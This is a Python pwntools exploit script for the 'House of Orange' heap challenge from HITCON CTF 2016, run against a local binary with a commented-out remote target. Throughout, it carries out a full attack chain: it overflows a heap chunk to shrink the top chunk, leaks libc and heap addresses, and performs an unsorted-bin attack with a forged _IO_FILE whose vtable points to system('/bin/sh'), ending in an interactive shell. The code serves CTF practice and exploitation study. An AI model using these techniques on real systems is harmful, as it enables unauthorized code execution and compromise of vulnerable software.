from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
p = process([ld_path, "./houseoforange_hitcon_2016"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path}) # p = process("")
# p = remote("node4.buuoj.cn", 28626)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, name, prize):
    sa("Your choice : ", "1")
    sa("Length of name :", str(size))
    sa("Name :", name)
    sa("Price of Orange:", str(prize))
    sa("Color of Orange:", "1")

def show():
    sa("Your choice : ", "2")

def edit(size, name, prize):
    sa("Your choice : ", "3")
    sa("Length of name :", str(size))
    sa("Name:", name)
    sa("Price of Orange: ", str(prize))
    sa("Color of Orange: ", "1")


# chunk overflow --> house of orange

# change top_chunk size
add(0x10, "a", 0)
pad = cyclic(0x10)
pad += p64(0)+p64(0x21)+cyclic(0x8)+p64(0)
pad += p64(0)+p64(0xfa1)
edit(len(pad), pad, 0)

# let top chunk to unsorted bin
add(0x1000, "a", 1)

# leak libc and heap 
add(0x400, cyclic(0x8), 2)  # large bin
show()
libc_info = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(libc_info))

edit(0x10, cyclic(0x10), 1)
show()
rud("daaa")
heap_info = u64(rud("\n").ljust(8, b"\x00"))
print("leak: ", hex(heap_info))

# count
libc = ELF(libc_path)
libc_base = libc_info-0x3c5188
print("libc base: ", hex(libc_base))
io_list_all = libc_base+libc.sym["_IO_list_all"]
system = libc_base+libc.sym["system"]

heap_base = heap_info & 0xfffffffffffff000
print("heap base: ", hex(heap_base))

# unsorted bin attack + FSOP
pad = cyclic(0x400)
pad += p64(0)+p64(0x21)+cyclic(0x8)+p64(0)

fsop = b"/bin/sh\x00"+p64(0x61)+p64(0)+p64(io_list_all-0x10)
fsop += p64(0)+p64(1)
fsop = fsop.ljust(0xd8, b"\x00")

vtable_addr = heap_base+0x4f0+0xe0 
fsop += p64(vtable_addr)
fsop += p64(0)*3+p64(system)

pad += fsop
edit(len(pad), pad, 2)

pause()
# attack
sa("Your choice : ", "1")

shell()


